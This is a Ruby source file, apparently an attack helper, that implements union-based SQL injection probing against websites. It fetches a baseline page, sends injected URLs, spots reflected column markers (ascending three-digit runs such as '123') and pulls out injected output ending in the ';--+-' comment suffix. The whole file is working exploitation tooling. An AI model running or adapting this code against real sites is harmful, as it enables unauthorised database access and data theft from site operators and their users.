require 'net/http'
require 'nokogiri'

class SQL_Injection
	attr_accessor *%i( web asal lihat lihat_union )

	def initialize(alamat)
		@lihat = []
		@lihat_union = false
		uri = URI.parse(alamat)
		@web = Net::HTTP.new(uri.host, uri.port)
		@web.use_ssl if harus_encrypt?(alamat)
		@asal = buat_pembanding(alamat)

		@asal.children.each { |i| elemen_berpotensi(i, ['body']) }
	end

	def buat_pembanding(alamat)
		halaman = Nokogiri::HTML.parse(web.get(alamat).body)
		halaman.css("body")
	end

	def elemen_berpotensi(elm, path)
		unless elm.text?
			if elm.name == "script"
			elsif elm.is_a?(Nokogiri::XML::Comment)
			elsif elm.name == "input"
			elsif elm.children.empty?
			else
				lihat_elemen(elm, path)
			end
			return
		end
		teks = elm.to_html
		unless (m = teks.match(/^\d\d\d$/)).nil?
			angka_acak = m[0].split(//).collect { |i| i.to_i }
			sebelum = angka_acak.first - 1
			mendaki = angka_acak.all? do |i|
				temp = sebelum
				sebelum = i
				i == temp + 1
			end
			path.unshift("!") if mendaki
		end
		@lihat << path.join(' ') if teks.match(/[\w\d]/)
	end

	def lihat_elemen(elm, path)
		path_sekarang = path.clone.push(css_pencarian(elm))
		elm.children.each do |anggota|
			elemen_berpotensi(anggota, path_sekarang)
		end
	end

	def refresh_halaman(url_inject)
		halaman = Nokogiri::HTML.parse(web.get(url_inject).body)
		File.write("berubah.html", halaman.to_html)
		puts url_inject[url_inject.index("'"), url_inject.size - url_inject.index("'")]

		if lihat_union
			return lihat_angka_3_naik_beruntun(halaman.css('body').first, ['body'])
		end

		berubah = []
		@lihat.each do |i|
			i = i.clone
			i.slice!(0, 2) if i =~ /^!/
			html = halaman.css(i).first
			html_asal = @asal.css(i).first
			next berubah.push(nil) unless html
			himpun = [html_asal, html].collect { |e| e.to_html }
			unless himpun[0] == himpun[1]
				b = perubahan_wajar?(url_inject, himpun)
				berubah.push(b) unless b.nil?
			end
		end
		return berubah.empty? ? nil : berubah
	end

	def lihat_angka_3_naik_beruntun(badan, path)
		tertangkap = {}
		menangkap = proc do |elm, path_elm, pr|
			elm.children.each do |c|
				if c.elem? && !c.children.empty?
					pr.call(c, path_elm.clone.push(css_pencarian(c)), pr)
				end
				next unless c.text?
				text = c.to_html
				if (m = text.match(/^\d\d\d$/))
					as = text.split(//).collect { |i| i.to_i }
					bs = as[0] - 1
					if as.all? { |i| tp = bs ; bs = i ; i == tp + 1 }
						tertangkap[text.to_sym] = [] unless tertangkap.has_key?(text.to_sym)
						tertangkap[text.to_sym].push(path_elm.clone)
					end
				end
			end
		end

		menangkap.call(badan, path, menangkap)
		return tertangkap
	end

	private
	def perubahan_wajar?(hipo, perubahan)
		asal = perubahan[0]
		jadi = perubahan[1]
		index_awal = 0
		index_akhir = 1
		akhir_berubah = false
		awal_berubah = false

		until [awal_berubah, akhir_berubah].all?
			unless awal_berubah
				awal_berubah = true unless asal[index_awal] == jadi[index_awal]
				index_awal += 1
			end
			unless akhir_berubah
				akhir_berubah = true unless asal[asal.size - index_akhir] == jadi[jadi.size - index_akhir]
				index_akhir += 1
			end
		end

		return nil if jadi.size < index_awal + index_akhir
		berubah = jadi[index_awal - 1, jadi.size - index_akhir - index_awal + 1]
		return nil unless berubah.slice!(-5, 5) == ";--+-"
		return berubah
	end

	def harus_encrypt?(alamat)
		!alamat.match(/^https\:/).nil?
	end

	def css_pencarian(elm)
		if elm.has_attribute?('id')
			"%s#%s" % [elm.name, elm.attribute('id')]
		elsif !elm.classes.empty?
			"%s.%s" % [elm.name, elm.classes.first]
		else
			elm.name
		end
	end
end